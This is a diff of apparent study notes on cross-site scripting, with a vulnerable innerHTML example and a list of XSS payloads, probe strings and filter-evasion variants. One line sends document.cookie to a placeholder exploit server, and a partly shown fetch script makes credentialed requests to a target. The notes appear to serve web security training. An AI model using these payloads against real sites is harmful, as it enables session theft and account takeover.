@@ -1,26 +1,33 @@
-DOM-based cross-site scripting:
+# XSS
+
+## DOM-based cross-site scripting:
+```
 var search = document.getElementById('search').value;
 var results = document.getElementById('results');
 results.innerHTML = 'You searched for: ' + search;
+```
 You searched for: <img src=1 onerror='/* Bad stuff here... */'>
 
 To find DOM-based vulnerabilities in non-URL-based input (such as document.cookie) or non-HTML-based sinks (like setTimeout), there is no substitute for reviewing JavaScript code
-eval() or innerHTML --> enables attackers to execute malicious JavaScript
+
+`eval()` or `innerHTML` --> enables attackers to execute malicious JavaScript
 
 DOM Invader --> Burp's built-in browser
 
-Example:
-alert(document.domain)
-alert(document.cookie)
-print()
-<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
-<script>alert("message")</script>
-<img src=x onerror=alert("message")>
-<img src=x onerror=prompt(1)>
-;</script><svg onload=alert("message")>
-?q=javascript:alert(1)
-?q=j%61vascript:alert(1)
+## Example:
+`<script>alert(12345)</script>`  
+`alert(document.domain)`  
+`alert(document.cookie)`  
+`print()`  
+`<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`  
+`<script>alert("message")</script>`  
+`<img src=x onerror=alert("message")>`  
+`<img src=x onerror=prompt(1)>`  
+`;</script><svg onload=alert("message")>`  
+`?q=javascript:alert(1)`  
+`?q=j%61vascript:alert(1)`  
 
+```
 "</script><script>
         fetch("https://targetURL.com", {
                   credentials: 'include'
@@ -41,3 +48,4 @@ print()
                 }
           })
 </script>
+```
